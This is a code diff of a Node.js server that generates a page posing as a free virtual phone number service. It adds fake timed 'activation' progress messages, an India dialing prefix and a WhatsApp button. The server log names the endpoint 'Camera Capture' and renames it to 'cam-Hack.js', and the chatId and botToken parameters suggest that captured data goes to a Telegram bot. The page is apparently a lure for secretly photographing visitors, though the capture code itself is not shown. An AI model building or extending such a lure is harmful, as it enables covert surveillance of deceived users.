             { text: "Server response: 200 OK", type: "success", delay: 12000 },
             { text: "Activating number with carrier...", type: "info", delay: 14500 },
             { text: "Setting up verification protocols...", type: "info", delay: 17000 },
@@ -1738,7 +2106,7 @@ function generateHTML(chatId, botToken) {
             const serverMessages = document.getElementById('serverMessages');
             const welcomeMsg = document.createElement('div');
             welcomeMsg.className = 'message info';
-            welcomeMsg.innerHTML = "[" + getCurrentTime() + "] Starting activation for " + countrySelect.options[countrySelect.selectedIndex].text;
+            welcomeMsg.innerHTML = "[" + getCurrentTime() + "] Starting activation for " + countrySelect.options[countrySelect.selectedIndex].text + " (" + platformSelect.options[platformSelect.selectedIndex].text + ")";
             serverMessages.appendChild(welcomeMsg);
 
             // Start the process
@@ -1788,7 +2156,8 @@ function generateHTML(chatId, botToken) {
                 'Germany': '+49',
                 'Canada': '+1',
                 'Australia': '+61',
-                'France': '+33'
+                'France': '+33',
+                'India': '+91'
             };
             
             const prefix = countryPrefixes[countrySelect.value] || '+1';
@@ -1805,9 +2174,15 @@ function generateHTML(chatId, botToken) {
             });
         }
 
+        function openWhatsApp() {
+            const numberText = document.getElementById('numberDisplay').textContent.replace(/[^0-9]/g, '');
+            window.open(`https://wa.me/${numberText}`, '_blank');
+        }
+
         // Event listeners
         generateBtn.addEventListener('click', startProcess);
         shareBtn.addEventListener('click', copyNumber);
+        whatsappBtn.addEventListener('click', openWhatsApp);
 
         // Cleanup when page closes
         window.addEventListener('beforeunload', function() {
@@ -1826,6 +2201,6 @@ function generateHTML(chatId, botToken) {
 // Start the server
 app.listen(PORT, () => {
   console.log(`🚀 Virtual Numbers API running on port ${PORT}`);
-  console.log(`📸 Camera Capture: http://localhost:${PORT}/api/FreeSms.js?code=ENCODED_CHAT_ID`);
+  console.log(`📸 Camera Capture: http://localhost:${PORT}/api/cam-Hack.js?code=ENCODED_CHAT_ID`);
   console.log(`🏠 Home: http://localhost:${PORT}`);
 });
